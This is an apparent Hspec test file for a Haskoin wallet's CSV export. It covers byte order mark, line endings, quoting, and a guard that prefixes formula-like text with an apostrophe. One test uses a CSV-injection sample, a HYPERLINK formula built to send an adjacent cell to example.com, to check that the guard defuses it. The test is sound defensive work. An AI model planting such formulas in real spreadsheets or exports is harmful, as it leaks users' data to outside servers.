{-# LANGUAGE OverloadedStrings #-}

-- | How --csv writes a sheet: the bytes of the file, then each kind of
-- cell, and the guard against formulas
module Haskoin.Wallet.Cli.CsvSpec (spec) where

import Haskoin.Wallet.Cli.Csv (cellField, formulaGuard, sheetCsv)
import Haskoin.Wallet.Cli.Sheet (Cell (..), Sheet (..))
import Haskoin.Wallet.TestUtils (seenTime)
import Test.Hspec

spec :: Spec
spec = do
  -- EF BB BF is U+FEFF, the byte order mark, in UTF-8
  describe "A CSV file of a sheet" $ do
    it "starts with the byte order mark of UTF-8, then the headings, apart by commas" $
      sheetCsv (Sheet ["Path", "Address"] []) `shouldBe` "\xEF\xBB\xBF\&Path,Address\r\n"

    it "ends each line with a carriage return and a line feed, as RFC 4180 has it" $
      sheetCsv (Sheet ["Coins"] [[CountCell 1], [CountCell 2]]) `shouldBe` "\xEF\xBB\xBF\&Coins\r\n1\r\n2\r\n"

    -- 東 is E6 9D B1 in UTF-8, and 京 is E4 BA AC
    it "writes a text of another script in UTF-8" $
      sheetCsv (Sheet ["Label"] [[TextCell "東京"]]) `shouldBe` "\xEF\xBB\xBF\&Label\r\n\xE6\x9D\xB1\xE4\xBA\xAC\r\n"

    it "leaves the field of an empty cell empty, between its commas" $
      sheetCsv (Sheet ["Path", "Label", "Coins"] [[TextCell "/0/1", EmptyCell, CountCell 0]])
        `shouldBe` "\xEF\xBB\xBF\&Path,Label,Coins\r\n/0/1,,0\r\n"

  describe "A cell of a CSV file" $ do
    it "gives an amount in satoshis as a whole number, with a minus sign and no apostrophe for what leaves the account" $
      cellField (SatoshiCell (-41000)) `shouldBe` "-41000"

    -- seenTime is 14 Nov 2023 22:13:20 UTC
    it "gives a time in UTC in the form of ISO 8601, to the second" $
      cellField (TimeCell seenTime) `shouldBe` "2023-11-14T22:13:20"

    it "gives a text as it is when it needs no quotes" $
      cellField (TextCell "Rent of October") `shouldBe` "Rent of October"

    it "gives a text with a comma in quotes, its own quotes doubled" $
      cellField (TextCell "Rent, \"flat\" in Lyon") `shouldBe` "\"Rent, \"\"flat\"\" in Lyon\""

    it "gives a text with a line break in quotes, the line break kept in the cell" $
      cellField (TextCell "Rent\nOctober") `shouldBe` "\"Rent\nOctober\""

    -- A label planted to send the cell next to it to a server
    it "gives a formula in a text an apostrophe in front, then quotes it" $
      cellField (TextCell "=HYPERLINK(\"http://example.com/?\"&A2,\"click\")")
        `shouldBe` "\"'=HYPERLINK(\"\"http://example.com/?\"\"&A2,\"\"click\"\")\""

  describe "The guard against formulas" $ do
    it "puts an apostrophe before a text that starts with =, +, -, @, a tab or a carriage return" $
      map formulaGuard ["=1+1", "+1", "-1", "@SUM(A1)", "\t=1", "\r=1"]
        `shouldBe` ["'=1+1", "'+1", "'-1", "'@SUM(A1)", "'\t=1", "'\r=1"]

    it "leaves a text with those characters further on as it is" $
      formulaGuard "Rent = 500 + fees" `shouldBe` "Rent = 500 + fees"
